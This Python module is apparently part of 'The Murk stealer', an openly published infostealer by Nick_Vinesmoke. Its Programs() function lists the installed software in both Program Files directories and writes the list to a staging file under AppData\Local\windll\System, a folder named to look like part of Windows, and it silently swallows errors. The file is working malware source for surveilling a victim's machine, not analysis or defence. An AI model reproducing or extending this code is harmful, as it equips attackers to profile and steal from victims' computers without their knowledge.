#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#

from os import environ,sep,listdir
"""
all needed paths
"""
path = r"C:\Program Files (x86)"
path1 = r"C:\Program Files"

def Programs():
    try:
        pathtofolder = environ['USERPROFILE'] + sep + r'AppData\Local'
        dirs = listdir(path)# all dirs in path
        with open(rf"{pathtofolder}\windll\System\Programs.txt", "a", encoding="utf-8") as prog:
             prog.write(path+"\n")# write it
        prog.close()
        for programs in dirs:
                with open(rf"{pathtofolder}\windll\System\Programs.txt", "a", encoding="utf-8") as prog:
                    prog.write(programs+"\n")# write it
        prog.close()



        dirs = listdir(path1)# all dirs in path1
        with open(rf"{pathtofolder}\windll\System\Programs.txt", "a", encoding="utf-8") as prog:
             prog.write(path1+"\n")# write it
        prog.close()
        for programs in dirs:
                with open(rf"{pathtofolder}\windll\System\Programs.txt", "a", encoding="utf-8") as prog:
                    prog.write(programs+"\n")# write it
        prog.close()
    except:
        pass